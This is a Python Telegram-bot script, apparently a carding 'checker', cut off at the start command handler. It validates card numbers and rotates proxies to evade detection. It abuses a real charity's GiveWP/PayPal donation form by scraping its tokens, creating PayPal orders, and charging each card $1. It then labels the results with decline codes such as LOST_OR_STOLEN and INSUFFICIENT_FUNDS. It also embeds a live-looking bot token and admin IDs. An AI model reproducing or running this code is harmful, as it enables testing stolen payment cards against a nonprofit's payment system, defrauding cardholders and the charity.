import asyncio
import aiohttp
import aiofiles
import time
import re
import base64
from datetime import datetime
from aiogram import Bot, Dispatcher, types, F
from aiogram.filters import Command
from aiogram.types import InlineKeyboardMarkup, InlineKeyboardButton, FSInputFile
from aiogram.fsm.storage.memory import MemoryStorage
from aiogram.client.default import DefaultBotProperties
from aiogram.enums import ParseMode

# Bot Configuration
TOKEN = '8568309620:AAG9dBWt2kdlN5yOUxg0ZMgZNSa9SvDm8Ag'
bot = Bot(token=TOKEN, default=DefaultBotProperties(parse_mode=ParseMode.HTML))
storage = MemoryStorage()
dp = Dispatcher(storage=storage)

# Global Variables
admin = 7926510116
myid = ['8597415233']
stopuser = {}
command_usage = {}

# Load proxies
def load_proxies():
    try:
        with open('proxies.txt', 'r') as f:
            proxies = []
            for line in f:
                line = line.strip()
                if line:
                    parts = line.split(':')
                    if len(parts) == 4:
                        host, port, user, password = parts
                        proxy_url = f"http://{user}:{password}@{host}:{port}"
                        proxies.append(proxy_url)
            return proxies
    except Exception as e:
        print(f"Error loading proxies: {e}")
        return []

PROXIES = load_proxies()
proxy_index = 0

def get_next_proxy():
    global proxy_index
    if not PROXIES:
        return None
    proxy = PROXIES[proxy_index % len(PROXIES)]
    proxy_index += 1
    return proxy


# Luhn Check
def luhn_check(number: str) -> bool:
    """Luhn algorithm to validate card number."""
    total = 0
    reverse_digits = number[::-1]
    for i, d in enumerate(reverse_digits):
        n = int(d)
        if i % 2 == 1:
            n *= 2
            if n > 9:
                n -= 9
        total += n
    return total % 10 == 0

# Card Parser
def reg(cc: str):
    """Parse card input and return PAN|MM|YY|CVC or None if invalid."""
    parts = [p for p in re.split(r'\D+', cc) if p != '']
    if len(parts) >= 4:
        pan = parts[0]
        mm = parts[1].zfill(2)
        yy = parts[2]
        cvc = parts[3]
        
        if len(yy) == 4 and (yy.startswith('20') or yy.startswith('19')):
            pass
        elif len(yy) == 1:
            return None
            
        is_amex = pan.startswith('34') or pan.startswith('37')
        expected_pan_len = 15 if is_amex else 16
        expected_cvc_len = 4 if is_amex else 3

        if not re.fullmatch(r'\d{%d}' % expected_pan_len, pan):
            return None
        if not re.fullmatch(r'\d{2}', mm) or not (1 <= int(mm) <= 12):
            return None
        if not (re.fullmatch(r'\d{2}', yy) or re.fullmatch(r'\d{4}', yy)):
            return None
        if not re.fullmatch(r'\d{%d}' % expected_cvc_len, cvc):
            return None
        if not luhn_check(pan):
            return None

        return f"{pan}|{mm}|{yy}|{cvc}"

    digits = ''.join(re.findall(r'\d', cc))
    if not digits:
        return None

    is_amex = digits.startswith('34') or digits.startswith('37')
    cvc_len = 4 if is_amex else 3
    min_len = (15 if is_amex else 16) + 2 + 2 + cvc_len
    
    if len(digits) < min_len:
        return None

    cvc = digits[-cvc_len:]
    rest = digits[:-cvc_len]

    yy_candidate = rest[-2:]
    mm_candidate = rest[-4:-2]
    pan_candidate = rest[:-4]

    if len(rest) >= 6 and rest[-4:-2] in ('20', '19'):
        yy = rest[-4:]
        mm = rest[-6:-4]
        pan = rest[:-6]
    else:
        yy = yy_candidate
        mm = mm_candidate
        pan = pan_candidate

    mm = mm.zfill(2)
    expected_pan_len = 15 if (pan.startswith('34') or pan.startswith('37')) else 16
    
    if not re.fullmatch(r'\d{%d}' % expected_pan_len, pan):
        return None
    if not re.fullmatch(r'\d{2}', mm) or not (1 <= int(mm) <= 12):
        return None
    if not (re.fullmatch(r'\d{2}', yy) or re.fullmatch(r'\d{4}', yy)):
        return None
    if not re.fullmatch(r'\d{%d}' % cvc_len, cvc):
        return None
    if not luhn_check(pan):
        return None

    return f"{pan}|{mm}|{yy}|{cvc}"


# Async PayPal Checker with retry
async def pali(ccx: str, max_retries=5):
    for attempt in range(max_retries):
        try:
            ccx = ccx.strip()
            n = ccx.split("|")[0]
            mm = ccx.split("|")[1]
            yy = ccx.split("|")[2]
            cvc = ccx.split("|")[3].strip()
            
            if "20" in yy:
                yy = yy.split("20")[1]
            
            proxy = get_next_proxy()
            print(f"[DEBUG] Checking card: {n[:6]}...{n[-4:]} | Attempt: {attempt+1}/{max_retries} | Proxy: {proxy[:30] if proxy else 'None'}...")
            
            cookies = {
                'cookieyes-consent': 'consentid:VFd5T1VzblFTS016M1QxdE9mVmdKMnNyRHFBaVpSTEM,consent:no,action:yes,necessary:yes,functional:no,analytics:no,performance:no,advertisement:no',
                'wp-give_session_7bdbe48ab4780b5199a37cfdcdbc963f': '1d11eb8a1cdd169bf553f0b5053584cd%7C%7C1770959142%7C%7C1770955542%7C%7C11f978ac4f4ed635065daf8017f7cd4e',
                'wp-give_session_reset_nonce_7bdbe48ab4780b5199a37cfdcdbc963f': '1',
            }
            
            headers = {
                'authority': 'ananau.org',
                'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8',
                'accept-language': 'ar-EG,ar;q=0.9,en-US;q=0.8,en;q=0.7',
                'cache-control': 'max-age=0',
                'referer': 'https://ananau.org/donate/donation/',
                'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Mobile Safari/537.36',
            }
            
            params = {
                'form-id': '14343',
                'payment-mode': 'paypal-commerce',
                'level-id': '3',
            }
            
            timeout = aiohttp.ClientTimeout(total=30)
            
            async with aiohttp.ClientSession(timeout=timeout) as session:
                # First Request
                print(f"[DEBUG] Step 1: Getting donation page...")
                async with session.get(
                    'https://ananau.org/donate/donation/',
                    cookies=cookies,
                    headers=headers,
                    params=params,
                    proxy=proxy
                ) as r1:
                    text1 = await r1.text()
                    print(f"[DEBUG] Step 1 Response: Status={r1.status}, Length={len(text1)}")
                
                # Parse response
                print(f"[DEBUG] Step 2: Parsing form data...")
                id_form1 = re.search(r'name="give-form-id-prefix" value="(.*?)"', text1)
                id_form2 = re.search(r'name="give-form-id" value="(.*?)"', text1)
                nonec = re.search(r'name="give-form-hash" value="(.*?)"', text1)
                enc = re.search(r'"data-client-token":"(.*?)"', text1)
                
                if not all([id_form1, id_form2, nonec, enc]):
                    print(f"[DEBUG] ⚠️ PARSING_ERROR: Missing form fields")
                    if attempt < max_retries - 1:
                        print(f"[DEBUG] 🔄 Retrying in 2 seconds... (Attempt {attempt+2}/{max_retries})")
                        await asyncio.sleep(2)
                        continue
                    print(f"[DEBUG] ❌ Max retries reached, returning PARSING_ERROR")
                    return "PARSING_ERROR"
                
                id_form1 = id_form1.group(1)
                id_form2 = id_form2.group(1)
                nonec = nonec.group(1)
                enc = enc.group(1)
                dec = base64.b64decode(enc).decode('utf-8')
                au = re.search(r'"accessToken":"(.*?)"', dec).group(1)
                print(f"[DEBUG] Parsed successfully: form_id={id_form2[:10]}...")
                
                # Second Request - Create Order
                print(f"[DEBUG] Step 3: Creating PayPal order...")
                headers2 = headers.copy()
                headers2.update({
                    'accept': '*/*',
                    'origin': 'https://ananau.org',
                    'referer': 'https://ananau.org/donate/donation/?form-id=14343&payment-mode=paypal-commerce&level-id=3',
                })
                
                form_data = aiohttp.FormData()
                form_data.add_field('give-honeypot', '')
                form_data.add_field('give-form-id-prefix', id_form1)
                form_data.add_field('give-form-id', id_form2)
                form_data.add_field('give-form-title', 'Donation')
                form_data.add_field('give-current-url', 'https://ananau.org/donate/donation/')
                form_data.add_field('give-form-url', 'https://ananau.org/donate/donation/')
                form_data.add_field('give-form-minimum', '1.00')
                form_data.add_field('give-form-maximum', '999999.99')
                form_data.add_field('give-form-hash', nonec)
                form_data.add_field('give-price-id', 'custom')
                form_data.add_field('give-amount', '1,00')
                form_data.add_field('payment-mode', 'paypal-commerce')
                form_data.add_field('give_first', 'fhjb')
                form_data.add_field('give_last', 'lkh')
                form_data.add_field('give_company_option', 'no')
                form_data.add_field('give_company_name', '')
                form_data.add_field('give_email', 'bnnbbhnn@gmail.com')
                form_data.add_field('card_name', 'Ali')
                form_data.add_field('card_exp_month', '')
                form_data.add_field('card_exp_year', '')
                form_data.add_field('give-gateway', 'paypal-commerce')
                
                async with session.post(
                    'https://ananau.org/wp-admin/admin-ajax.php',
                    params={'action': 'give_paypal_commerce_create_order'},
                    cookies=cookies,
                    headers=headers2,
                    data=form_data,
                    proxy=proxy
                ) as r2:
                    json2 = await r2.json()
                    print(f"[DEBUG] Step 3 Response: {json2}")
                    order_id = json2['data']['id']
                    print(f"[DEBUG] Order created: {order_id}")
                
                # Third Request - PayPal Confirm
                print(f"[DEBUG] Step 4: Confirming payment with PayPal...")
                headers3 = {
                    'authority': 'cors.api.paypal.com',
                    'accept': '*/*',
                    'accept-language': 'ar-EG,ar;q=0.9,en-US;q=0.8,en;q=0.7',
                    'authorization': f'Bearer {au}',
                    'braintree-sdk-version': '3.32.0-payments-sdk-dev',
                    'content-type': 'application/json',
                    'origin': 'https://assets.braintreegateway.com',
                    'referer': 'https://assets.braintreegateway.com/',
                    'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Mobile Safari/537.36',
                }
                
                json_data = {
                    'payment_source': {
                        'card': {
                            'number': n,
                            'expiry': f'20{yy}-{mm}',
                            'security_code': cvc,
                            'attributes': {
                                'verification': {
                                    'method': 'SCA_WHEN_REQUIRED',
                                },
                            },
                        },
                    },
                    'application_context': {
                        'vault': False,
                    },
                }
                
                async with session.post(
                    f'https://cors.api.paypal.com/v2/checkout/orders/{order_id}/confirm-payment-source',
                    headers=headers3,
                    json=json_data,
                    proxy=proxy
                ) as r3:
                    print(f"[DEBUG] Step 4 Response: Status={r3.status}")
                
                # Fourth Request - Approve Order
                print(f"[DEBUG] Step 5: Approving order...")
                async with session.post(
                    'https://ananau.org/wp-admin/admin-ajax.php',
                    params={'action': 'give_paypal_commerce_approve_order', 'order': order_id},
                    cookies=cookies,
                    headers=headers2,
                    data=form_data,
                    proxy=proxy
                ) as r4:
                    text4 = await r4.text()
                    print(f"[DEBUG] Step 5 Response: {text4[:200]}...")
                
                # Parse Result
                if 'true' in text4 or 'sucsess' in text4:
                    print(f"[DEBUG] ✅ CHARGE SUCCESS")
                    return 'CHARGE 1.00$'
                elif 'DO_NOT_HONOR' in text4:
                    return "DO_NOT_HONOR"
                elif 'ACCOUNT_CLOSED' in text4:
                    return "ACCOUNT_CLOSED"
                elif 'PAYER_ACCOUNT_LOCKED_OR_CLOSED' in text4:
                    return "PAYER_ACCOUNT_LOCKED_OR_CLOSED"
                elif 'LOST_OR_STOLEN' in text4:
                    return "LOST_OR_STOLEN"
                elif 'CVV2_FAILURE' in text4:
                    return "CVV2_FAILURE"
                elif 'SUSPECTED_FRAUD' in text4:
                    return "SUSPECTED_FRAUD"
                elif 'INVALID_ACCOUNT' in text4:
                    return "INVALID_ACCOUNT"
                elif 'REATTEMPT_NOT_PERMITTED' in text4:
                    return "REATTEMPT_NOT_PERMITTED"
                elif 'ACCOUNT_BLOCKED_BY_ISSUER' in text4:
                    return "ACCOUNT_BLOCKED_BY_ISSUER"
                elif 'ORDER_NOT_APPROVED' in text4:
                    return "ORDER_NOT_APPROVED"
                elif 'PICKUP_CARD_SPECIAL_CONDITIONS' in text4:
                    return "PICKUP_CARD_SPECIAL_CONDITIONS"
                elif 'PAYER_CANNOT_PAY' in text4:
                    return "PAYER_CANNOT_PAY"
                elif 'INSUFFICIENT_FUNDS' in text4:
                    return "INSUFFICIENT_FUNDS"
                elif 'GENERIC_DECLINE' in text4:
                    return "GENERIC_DECLINE"
                elif 'COMPLIANCE_VIOLATION' in text4:
                    return "COMPLIANCE_VIOLATION"
                elif 'TRANSACTION_NOT_PERMITTED' in text4:
                    return "TRANSACTION_NOT_PERMITTED"
                elif 'PAYMENT_DENIED' in text4:
                    return "PAYMENT_DENIED"
                elif 'INVALID_TRANSACTION' in text4:
                    return "INVALID_TRANSACTION"
                elif 'RESTRICTED_OR_INACTIVE_ACCOUNT' in text4:
                    return "RESTRICTED_OR_INACTIVE_ACCOUNT"
                elif 'SECURITY_VIOLATION' in text4:
                    return "SECURITY_VIOLATION"
                elif 'DECLINED_DUE_TO_UPDATED_ACCOUNT' in text4:
                    return "DECLINED_DUE_TO_UPDATED_ACCOUNT"
                elif 'INVALID_OR_RESTRICTED_CARD' in text4:
                    return "INVALID_OR_RESTRICTED_CARD"
                elif 'EXPIRED_CARD' in text4:
                    return "EXPIRED_CARD"
                elif 'CRYPTOGRAPHIC_FAILURE' in text4:
                    return "CRYPTOGRAPHIC_FAILURE"
                elif 'TRANSACTION_CANNOT_BE_COMPLETED' in text4:
                    return "TRANSACTION_CANNOT_BE_COMPLETED"
                elif 'DECLINED_PLEASE_RETRY' in text4:
                    return "DECLINED_PLEASE_RETRY_LATER"
                elif 'TX_ATTEMPTS_EXCEED_LIMIT' in text4:
                    return "TX_ATTEMPTS_EXCEED_LIMIT"
                else:
                    try:
                        json4 = await r4.json()
                        return json4['data']['error']
                    except:
                        return "UNKNOWN_ERROR"
        
        except asyncio.TimeoutError:
            print(f"[DEBUG] ⚠️ TIMEOUT_ERROR on attempt {attempt+1}/{max_retries}")
            if attempt < max_retries - 1:
                print(f"[DEBUG] 🔄 Retrying in 2 seconds...")
                await asyncio.sleep(2)
                continue
            print(f"[DEBUG] ❌ Max retries reached, returning TIMEOUT_ERROR")
            return "TIMEOUT_ERROR"
        except aiohttp.ClientProxyConnectionError:
            print(f"[DEBUG] ⚠️ PROXY_ERROR on attempt {attempt+1}/{max_retries}")
            if attempt < max_retries - 1:
                print(f"[DEBUG] 🔄 Retrying with different proxy in 2 seconds...")
                await asyncio.sleep(2)
                continue
            print(f"[DEBUG] ❌ Max retries reached, returning PROXY_ERROR")
            return "PROXY_ERROR"
        except aiohttp.ClientConnectionError:
            print(f"[DEBUG] ⚠️ CONNECTION_ERROR on attempt {attempt+1}/{max_retries}")
            if attempt < max_retries - 1:
                print(f"[DEBUG] 🔄 Retrying in 2 seconds...")
                await asyncio.sleep(2)
                continue
            print(f"[DEBUG] ❌ Max retries reached, returning CONNECTION_ERROR")
            return "CONNECTION_ERROR"
        except AttributeError as e:
            print(f"[DEBUG] ⚠️ PARSING_ERROR: {e}")
            if attempt < max_retries - 1:
                print(f"[DEBUG] 🔄 Retrying in 2 seconds...")
                await asyncio.sleep(2)
                continue
            print(f"[DEBUG] ❌ Max retries reached, returning PARSING_ERROR")
            return "PARSING_ERROR"
        except Exception as e:
            print(f"[DEBUG] ❌ ERROR: {type(e).__name__}: {str(e)}")
            if attempt < max_retries - 1:
                print(f"[DEBUG] 🔄 Retrying in 2 seconds...")
                await asyncio.sleep(2)
                continue
            return f"ERROR: {str(e)}"
    
    return "MAX_RETRIES_EXCEEDED"


# Async BIN Lookup
async def dato(zh: str):
    try:
        timeout = aiohttp.ClientTimeout(total=10)
        headers = {
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
            'Accept': 'application/json',
            'Accept-Encoding': 'gzip, deflate'  # Remove br (brotli) encoding
        }
        
        async with aiohttp.ClientSession(timeout=timeout) as session:
            async with session.get(
                f"https://bins.antipublic.cc/bins/{zh}",
                headers=headers
            ) as response:
                if response.status == 200:
                    api_url = await response.json()
                    brand = api_url.get("brand", "Unknown")
                    card_type = api_url.get("type", "Unknown")
                    level = api_url.get("level", "Unknown")
                    bank = api_url.get("bank", "Unknown")
                    country_name = api_url.get("country_name", "Unknown")
                    country_flag = api_url.get("country_flag", "🏳️")
                    
                    mn = f'''[<a href="https://t.me/l">ϟ</a>] 𝐁𝐢𝐧: <code>{brand} - {card_type} - {level}</code>
[<a href="https://t.me/l">ϟ</a>] 𝐁𝐚𝐧𝐤: <code>{bank} - {country_flag}</code>
[<a href="https://t.me/l">ϟ</a>] 𝐂𝐨𝐮𝐧𝐭𝐫𝐲: <code>{country_name} [ {country_flag} ]</code>'''
                    return mn
                else:
                    return '[<a href="https://t.me/l">ϟ</a>] 𝐁𝐢𝐧: <code>Info not available</code>'
    except asyncio.TimeoutError:
        return '[<a href="https://t.me/l">ϟ</a>] 𝐁𝐢𝐧: <code>Lookup timeout</code>'
    except Exception as e:
        print(f"BIN Lookup Error: {e}")
        return '[<a href="https://t.me/l">ϟ</a>] 𝐁𝐢𝐧: <code>Info not available</code>'


# Start Command Handler
@dp.message(Command("start"))
    
